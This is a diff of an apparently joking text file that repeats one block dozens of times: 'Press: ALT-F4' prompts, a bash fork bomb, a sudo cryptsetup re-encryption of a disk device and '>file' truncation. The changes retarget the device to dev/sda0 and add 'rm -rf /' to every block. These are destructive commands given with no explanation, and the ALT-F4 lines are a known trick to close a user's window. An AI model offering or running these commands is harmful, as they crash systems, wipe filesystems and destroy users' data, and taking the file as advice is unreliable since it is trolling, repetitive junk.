@@ -7,7 +7,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -19,7 +20,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -31,20 +33,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
->file
-Don't hack the hand that feeds you.
-
-Press: ALT-F4
-Press: ALT-F4.
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-°^°
-<off>
-:(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -56,7 +46,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -68,7 +59,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -80,7 +72,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -92,7 +85,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -104,20 +98,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
->file
-Don't hack the hand that feeds you.
-
-Press: ALT-F4
-Press: ALT-F4.
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-°^°
-<off>
-:(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -129,7 +111,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -141,7 +124,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -153,7 +137,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -165,7 +150,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -177,20 +163,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
->file
-Don't hack the hand that feeds you.
-
-Press: ALT-F4
-Press: ALT-F4.
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-°^°
-<off>
-:(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -202,7 +176,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -214,20 +189,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
->file
-Don't hack the hand that feeds you.
-
-Press: ALT-F4
-Press: ALT-F4.
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-°^°
-<off>
-:(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -239,7 +202,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -251,20 +215,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
->file
-Don't hack the hand that feeds you.
-
-Press: ALT-F4
-Press: ALT-F4.
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-Press: ALT-F4
-°^°
-<off>
-:(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -276,7 +228,8 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
 Press: ALT-F4
@@ -288,6 +241,306 @@ Press: ALT-F4
 °^°
 <off>
 :(){ :|:& };:
-sudo cryptsetup reencrypt dev/DeathToWednesday0
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
+>file
+Don't hack the hand that feeds you.
+Press: ALT-F4
+Press: ALT-F4.
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+Press: ALT-F4
+°^°
+<off>
+:(){ :|:& };:
+sudo cryptsetup reencrypt dev/sda0
+rm -rf /
 >file
 Don't hack the hand that feeds you.
